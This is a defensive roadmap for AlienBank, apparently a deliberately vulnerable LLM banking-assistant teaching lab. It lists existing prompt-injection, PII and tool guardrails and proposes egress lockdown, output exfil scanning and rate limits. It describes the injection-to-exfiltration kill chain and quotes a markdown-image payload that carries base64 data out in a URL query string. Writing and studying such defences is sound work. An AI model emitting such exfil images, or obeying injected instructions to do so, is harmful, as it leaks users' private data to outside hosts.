# AlienBank — Runtime Protection Roadmap (Future Work)

Additional **runtime protection** controls recommended on top of what AlienBank
already ships. This is the backlog that came out of the runtime-protection review
(2026-08): the app already achieves the four target categories — **prompt
injection defenses, PII scrubbing, anomaly monitoring, and agent action
guardrails** — on the secure / L2+ path. The items below close the remaining
gaps, chiefly the **injection → exfiltration kill chain** and the thin **default
(L0/L1) posture**.

> **Read this in context.** AlienBank is a deliberately-vulnerable *teaching lab*.
> Some "gaps" (no defenses at Level 0) are the intended lesson. Items tagged
> **[lab-safe]** can be added without weakening the graded attack ladder; items
> tagged **[prod]** matter for a real deployment but should stay level-gated so
> the lab's lower levels remain attackable.

Legend: 🔴 high value · 🟡 medium · 🟢 polish.

---

## Current coverage (baseline — already implemented)

For reference, the controls these items build on:

| Category | Implemented |
|---|---|
| Prompt injection | D0 spotlighting + profile-field sanitization (`prompts.py`), D1 regex (`guardrails.py`), D2 LLM classifier, D6 external injection guard direct+indirect (`injection_guard.py`), and `secure_agent` session-bound tools as the real enforcement boundary |
| PII scrubbing | Allow-list SIEM serializer (`seclog._project`), `amount_band`, HMAC `target_ref`, D4 output firewall (L3), D5 canary (L2+) |
| Anomaly monitoring | PII-free ECS event stream → Fluentd → OpenSearch; 8 detection monitors (`k8s/siem/monitors.json`); auth-burst brute-force/spraying detection |
| Agent action guardrails | D3 tool guard (teller-only + cross-tenant check), HITL transfer confirmation, `max_turns=8`, RAG audience partitioning |

---

## Backlog

### 1. 🔴 Egress / tool-call allow-listing  `[prod]`

**Gap.** The app pod can make arbitrary outbound calls. Prompt injection's usual
end goal is **exfiltration** (e.g. the WithSecure `![](https://withsecure.com?q=<base64>)`
markdown-image payload). Input-side guards (D1/D2/D6) lower the odds but can't
*guarantee* the exfil channel is closed.

**Add.** A default-deny **Kubernetes `NetworkPolicy`** on the `alienbank`
namespace that allows egress only to the required hosts (Bedrock runtime, Ollama
/ embed endpoint, DNS). Everything else denied.

**Reference.** The sibling `agentic_secai` project has an inline mediation-proxy
/ egress-lockdown pattern (`feat(deploy): inline gateway sidecar + egress
lockdown artifacts`) — pull that approach here rather than reinventing it.

**Effort.** Small (one manifest) for the NetworkPolicy; medium if adopting the
sidecar proxy for L7 allow-listing.

---

### 2. 🔴 Always-on output exfil / injection scan (a "D7" output layer)  `[lab-safe]`

**Gap.** D4 (output firewall) is **L3-only**. There is no output-side check at
L0–L2, so an exfil channel that slips past the input guards reaches the user.

**Add.** A lightweight, **all-levels** scan of every model reply for exfil
vectors: outbound URLs, markdown images/links with query-string payloads, and
`data:` URIs. Redact or flag before the reply is returned. This is the "D7 output
scan" originally scoped before the in-image LLM Guard was dropped for size — keep
it as a cheap regex/heuristic check, not a torch model.

**Effort.** Small. Slots into `chat.run_chat` alongside D5 (`guardrails.py`).

---

### 3. 🟡 Baseline rate limit + resource caps at L0/L1 (denial-of-wallet, LLM10)  `[prod]`

**Gap.** `RATE_MAX`/`MAX_MESSAGE_CHARS` caps exist but are **L2+ only**
(`app.py`). Default L0/L1 is uncapped. Separately, **`/api/loans/limit?refresh=true`**
forces a fresh expensive full-statement LLM analysis and is **not** covered by
the chat rate limiter at any level — an authenticated user can loop it.

**Add.** An unconditional baseline rate limit + message-size floor at all levels
(keep the stricter L2+ caps on top), and bring the loan-limit refresh endpoint
under the limiter.

**Effort.** Small.

---

### 4. 🟡 Distributed state for limiter + burst detection  `[prod]`

**Gap.** The rate limiter, auth-fail tracker, and server-held chat history are
**in-process dicts** (`app.py`). With `replicas > 1` the throttles and burst
detection don't hold globally, and server-side history isn't shared.

**Add.** Back these with Redis (or equivalent) so per-session throttles,
auth-burst counters, and history survive horizontal scaling. **Prerequisite for
scaling `replicas` above 1.**

**Effort.** Medium.

---

### 5. 🟡 Grounding / hallucination check on RAG answers (LLM09)  `[lab-safe]`

**Gap.** Ingest-time scanning + provenance exist, but there is no **output**
groundedness check — nothing verifies the answer is supported by the retrieved
passages.

**Add.** A programmatic grounding check as a D7-class output control (answer
entailed by retrieved chunks?). Bedrock **contextual grounding** is output-only
and fits here directly; a local NLI/entailment check is the offline equivalent.

**Effort.** Medium.

---

### 6. 🟢 Tool-output schema/type validation before re-entering the model  `[lab-safe]`

**Gap.** Tool outputs re-enter the model as free text. A malformed or oversized
tool result isn't structurally validated first.

**Add.** Validate tool outputs against an expected schema/type (and size-cap)
before they go back into the agent loop. Also emit a per-turn **defense-efficacy
metric** from the guardrail decisions already collected on the context.

**Effort.** Small–medium.

---

### 7. 🟢 Secret / credential scanning on the user-facing reply  `[lab-safe]`

**Gap.** The allow-list serializer protects the **logs** from PII/secret egress,
but nothing scans the **reply the user sees** for leaked tokens/keys/secrets.

**Add.** A dedicated secret-pattern scanner on the outbound reply (complements
D4/D5 and the PII allow-list). Pairs naturally with item #2.

**Effort.** Small.

---

## Priority summary

| # | Control | Priority | Tag | Effort |
|---|---|---|---|---|
| 1 | Egress / tool-call allow-listing (NetworkPolicy) | 🔴 | prod | S–M |
| 2 | Always-on output exfil scan (D7) | 🔴 | lab-safe | S |
| 3 | Baseline rate limit at L0/L1 + cover loan-refresh | 🟡 | prod | S |
| 4 | Distributed state for limiter/burst (Redis) | 🟡 | prod | M |
| 5 | RAG output grounding check | 🟡 | lab-safe | M |
| 6 | Tool-output schema validation + efficacy metric | 🟢 | lab-safe | S–M |
| 7 | Secret scanning on outbound reply | 🟢 | lab-safe | S |

**Highest-value pair:** #1 (egress lockdown) + #2 (always-on output exfil scan).
Together they close the **injection → exfiltration** kill chain that input-side
guards alone cannot guarantee.
